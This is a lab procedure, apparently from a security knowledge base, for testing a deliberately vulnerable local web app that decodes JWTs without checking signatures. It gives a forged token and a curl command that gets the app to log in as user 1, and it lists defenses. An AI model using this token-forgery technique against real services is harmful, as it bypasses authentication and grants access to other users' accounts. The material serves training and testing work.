---
tags:
  - jwt
  - testing
  - authentication
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/jwt.io]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-jwt-token-jti1]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:19.041Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 6855a2f9-2489-4cb2-8b2c-d7caed0ea74e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Test-JWT-Authentication-with-Crafted-Token

## Summary

This procedure tests the vulnerable application's acceptance of a crafted JWT token with an invalid signature, confirming that only the payload is decoded without verification.

## Description

Using jwt.io, craft a JWT with header {"alg":"HS256","typ":"JWT"}, payload {"jti":1}, and an arbitrary base64 signature (e.g., invalid one). Send it via Authorization Bearer header to the / route, where the middleware extracts jti as user_id without signature check, logging it.

## Requirements

1. Running vulnerable app from setup procedure
2. Access to localhost:3000
3. jwt.io for token crafting

## Defense

Defensive measures and detection strategies:

- Enforce JWT signature verification with jwt.verify
- Log and alert on token decode failures
- Rate-limit auth attempts
- Validate token claims against DB

## Objectives

1. Confirm vulnerability by accepting unverified token
2. Extract and log payload data
3. Baseline for forgery testing

## Instructions

### Step 1: Craft Base Token

**Context**: Generate a simple JWT with jti=1 and invalid signature using jwt.io.

No command; use [[tools/jwt.io]] to create 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc'.

### Step 2: Send Test Request

**Context**: Test token acceptance on the endpoint.

**Command** ([[commands/curl-send-jwt-token-jti1]]):
```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

> Sends GET request; app decodes payload and logs 'logged in as: 1'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-send-jwt-token-jti1]]

## Tools Used

- [[tools/curl]]
- [[tools/jwt.io]]

## Tags

- jwt
- testing
- authentication
